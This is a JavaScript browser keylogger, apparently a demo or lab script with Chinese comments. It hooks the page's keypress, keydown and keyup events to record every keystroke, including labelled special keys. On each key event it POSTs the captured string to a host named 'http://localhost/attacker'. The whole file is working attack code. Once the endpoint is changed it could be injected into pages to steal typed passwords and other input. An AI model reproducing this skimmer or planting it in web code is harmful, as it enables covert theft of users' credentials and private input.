var keystring = "";//记录按键的字符串
function $(s) { return document.getElementById(s) ? document.getElementById(s) : s; }
function keypress(e) {
    var currKey = 0, CapsLock = 0, e = e || event;
    currKey = e.keyCode || e.which || e.charCode;
    CapsLock = currKey >= 65 && currKey <= 90;
    switch (currKey) {
        //屏蔽了退格、制表、回车、空格、方向键、删除键
        case 8: case 9: case 13: case 32: case 37: case 38: case 39: case 40: case 46: keyName = ""; break;
        default: keyName = String.fromCharCode(currKey); break;
    }
    keystring += keyName;
}
function keydown(e) {
    var e = e || event;
    var currKey = e.keyCode || e.which || e.charCode;
    if ((currKey > 7 && currKey < 14) || (currKey > 31 && currKey < 47)) {
        switch (currKey) {
            case 8: keyName = "[退格]"; break;
            case 9: keyName = "[制表]"; break;
            case 13: keyName = "[回车]"; break;
            case 32: keyName = "[空格]"; break;
            case 33: keyName = "[PageUp]"; break;
            case 34: keyName = "[PageDown]"; break;
            case 35: keyName = "[End]"; break;
            case 36: keyName = "[Home]"; break;
            case 37: keyName = "[方向键左]"; break;
            case 38: keyName = "[方向键上]"; break;
            case 39: keyName = "[方向键右]"; break;
            case 40: keyName = "[方向键下]"; break;
            case 46: keyName = "[删除]"; break;
            default: keyName = ""; break;
        }
        keystring += keyName;
    }
    $("content").innerHTML = keystring;
    send_record(keystring)
}
function keyup(e) {
    $("content").innerHTML = keystring;
    send_record(keystring)
}
document.onkeypress = keypress;
document.onkeydown = keydown;
document.onkeyup = keyup;


function send_record(eve) {
	console.log('Record!');
	var xhr_itm;
    if (window.XMLHttpRequest)// IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
    {
        xhr_itm=new XMLHttpRequest();
    }
    else// IE6, IE5 浏览器执行代码
    {
        xhr_itm=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xhr_itm.onreadystatechange=function()
    {
        if (xhr_itm.readyState==4 && xhr_itm.status==200)
        {
        	console.log('Success!');
        }
    }
    xhr_itm.open("POST","http://localhost/attacker",true);
    xhr_itm.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    sed_val = 'key='+eve;
    xhr_itm.send(sed_val);
}